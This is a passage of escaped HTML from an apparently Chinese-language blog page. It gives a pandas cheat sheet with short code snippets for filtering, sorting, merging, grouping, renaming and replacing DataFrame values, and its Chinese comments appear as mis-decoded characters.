&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># np.isinï¼Œä¿ç•™ name åŒ¹é…åˆ—è¡¨ä¸­çš„åå­—&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df&lt;span class="o">[&lt;/span>np.isin&lt;span class="o">(&lt;/span>df&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>, &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>,&lt;span class="o">])]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># np.isin, invertï¼Œä¿ç•™ name ä¸åœ¨åˆ—è¡¨ä¸­çš„&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df&lt;span class="o">[&lt;/span>np.isin&lt;span class="o">(&lt;/span>df&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>, &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;d&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;e&amp;#39;&lt;/span>,&lt;span class="o">]&lt;/span>, &lt;span class="nv">invert&lt;/span>&lt;span class="o">=&lt;/span>True&lt;span class="o">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># MultiIndexï¼Œå–ç¬¬ä¸€é¡¹åšè¿‡æ»¤&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df&lt;span class="o">[&lt;/span>np.isin&lt;span class="o">(&lt;/span>df.index.get_level_values&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>, &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="o">])]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>æ•°æ®æ’åº&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df.sort_values&lt;span class="o">(&lt;/span>&lt;span class="nv">by&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span>, &lt;span class="nv">ascending&lt;/span>&lt;span class="o">=&lt;/span>False&lt;span class="o">)&lt;/span>.reset_index&lt;span class="o">(&lt;/span>&lt;span class="nv">drop&lt;/span>&lt;span class="o">=&lt;/span>True&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>è¡Œéå†&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">index&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">row&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">df&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">iterrows&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;c1&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;c2&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>åˆ¤æ–­æ˜¯å¦æ˜¯ NaN&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è¿™é‡Œ costs æ˜¯ä¸€ä¸ª Series&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Series æ”¯æŒ filter, min ç­‰æ“ä½œï¼Œä¹Ÿæ”¯æŒ costs[&amp;#39;10.11.10&amp;#39;] è¿™ç§æŒ‰ key å–å€¼çš„æ“ä½œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">filtered_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">filter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">lambda&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">math&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isnan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">costs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>è¡¨çš„è”åˆ&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">df&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pd&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">df1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">df2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">ignore_index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sort&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>è¡¨åˆå¹¶ï¼ˆç±»ä¼¼ SQL çš„ joinï¼‰&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åœ¨å¤šä¸ªåˆ—ä¸Šåšåˆå¹¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> pd.merge&lt;span class="o">(&lt;/span>df1, df2, &lt;span class="nv">on&lt;/span>&lt;span class="o">=[&lt;/span>&lt;span class="s1">&amp;#39;p_date&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;ABå®éªŒåˆ†ç»„åç§°&amp;#39;&lt;/span>&lt;span class="o">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>ä»…ä¿ç•™æŸäº›åˆ—ã€åˆ é™¤æŸäº›åˆ—&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä¿ç•™æŒ‡å®šåˆ—&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df&lt;span class="o">[[&lt;/span>&lt;span class="s1">&amp;#39;p_date&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;ABå®éªŒåˆ†ç»„åç§°&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;ç‚¹å‡»åˆ°ç”¨æˆ·å¯è§é¦–å±(90åˆ†ä½)&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;ç‚¹å‡»åˆ°ä¸šåŠ¡UIå¯è§é¦–å±(90åˆ†ä½)&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;ç‚¹å‡»åˆ°ç”¨æˆ·å¯è§é¦–å±ï¼ˆå‡å€¼ï¼‰&amp;#39;&lt;/span>&lt;span class="o">]]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ é™¤æŸäº›åˆ—&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df.drop&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;column_name&amp;#39;&lt;/span>, &lt;span class="nv">axis&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># drop by condition&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> df.drop&lt;span class="o">(&lt;/span>df&lt;span class="o">[(&lt;/span>df.score &amp;lt; 50&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> &lt;span class="o">(&lt;/span>df.score &amp;gt; 20&lt;span class="o">)]&lt;/span>.index&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># drop by lambda&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">df&lt;span class="o">[&lt;/span>df.apply&lt;span class="o">(&lt;/span>lambda x: True &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>x&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;cost&amp;#39;&lt;/span>&lt;span class="o">])&lt;/span> &amp;gt; &lt;span class="m">6&lt;/span> &lt;span class="k">else&lt;/span> False, &lt;span class="nv">axis&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">)]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>æŒ‡å®šæŸåˆ—çš„å–å€¼ï¼Œä»…ä¿ç•™è¿™äº›å–å€¼çš„è¡Œ&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ‰€æœ‰ base åˆ†ç»„&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df_base&lt;/span> &lt;span class="o">=&lt;/span> df.loc&lt;span class="o">[&lt;/span>df&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;ABå®éªŒåˆ†ç»„åç§°&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>.isin&lt;span class="o">([&lt;/span>&lt;span class="s1">&amp;#39;base1&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;base2&amp;#39;&lt;/span>&lt;span class="o">])]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ‰€æœ‰å®éªŒåˆ†ç»„&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">df_exp&lt;/span> &lt;span class="o">=&lt;/span> df.loc&lt;span class="o">[&lt;/span>df&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;ABå®éªŒåˆ†ç»„åç§°&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>.isin&lt;span class="o">([&lt;/span>&lt;span class="s1">&amp;#39;exp1&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;exp2&amp;#39;&lt;/span>&lt;span class="o">])]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>åˆ†åˆ«è®¡ç®—æŸäº›åˆ—çš„å‡å€¼&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ†åˆ«è®¡ç®—è¿™ä¸¤åˆ—çš„å‡å€¼&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">df1&lt;span class="o">[[&lt;/span>&lt;span class="s1">&amp;#39;duration1&amp;#39;&lt;/span>, &lt;span class="s1">&amp;#39;duration2&amp;#39;&lt;/span>&lt;span class="o">]]&lt;/span>.mean&lt;span class="o">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>groupby, agg&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŒ‰ type åˆ†ç»„ï¼Œå¹¶è®¡ç®—ä¸åŒ type çš„ counts æ€»å’Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">df&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">df&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">groupby&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">as_index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="s1">&amp;#39;counts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">agg&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;sum&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;sum&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŒ‰ name åˆ†ç»„ï¼Œå¹¶æŒ‰åˆ†ç»„åˆ†åˆ«è®¡ç®— cost/ä¸ŠæŠ¥æ•°é‡ è¿™ä¸¤åˆ—çš„åˆ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">df_names&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">df&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">groupby&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">as_index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">agg&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="s1">&amp;#39;cost&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;sum&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;ä¸ŠæŠ¥æ•°é‡&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;sum&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>rename column name&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">df&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rename&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">columns&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;oldName1&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;newName1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;oldName2&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;newName2&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="n">inplace&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>applyï¼Œå˜æ¢&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¯¹åˆ— a åº”ç”¨ä¸€ä¸ª lambda è¡¨è¾¾å¼&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">df&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">df&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">apply&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">lambda&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ é™¤ name ä¸­ &amp;#34;.&amp;#34;åŠ&amp;#34;.&amp;#34;å‰é¢çš„å­—ç¬¦ä¸²&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">strip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">idx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rfind&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">idx&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">df&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">df&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">apply&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>replaceï¼šåˆ—å–å€¼çš„æ›¿æ¢&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&amp;gt;&amp;gt;&amp;gt; &lt;span class="nv">df&lt;/span> &lt;span class="o">=&lt;/span> pd.DataFrame&lt;span class="o">({&lt;/span>&lt;span class="s1">&amp;#39;col2&amp;#39;&lt;/span>: &lt;span class="o">{&lt;/span>0: &lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>, 1: 2, 2: np.nan&lt;span class="o">}&lt;/span>, &lt;span class="s1">&amp;#39;col1&amp;#39;&lt;/span>: &lt;span class="o">{&lt;/span>0: &lt;span class="s1">&amp;#39;w&amp;#39;&lt;/span>, 1: 1, 2: 2&lt;span class="o">}})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt;&amp;gt;&amp;gt; &lt;span class="nv">di&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">{&lt;/span>1: &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>, 2: &lt;span class="s2">&amp;#34;B&amp;#34;&lt;/span>&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt;&amp;gt;&amp;gt; df
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> col1 col2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> w a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> &lt;span class="m">1&lt;/span> &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">2&lt;/span> &lt;span class="m">2&lt;/span> NaN
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt;&amp;gt;&amp;gt; df.replace&lt;span class="o">({&lt;/span>&lt;span class="s2">&amp;#34;col1&amp;#34;&lt;/span>: di&lt;span class="o">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> col1 col2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> w a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> A &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">2&lt;/span> B NaN
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="series">Series&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
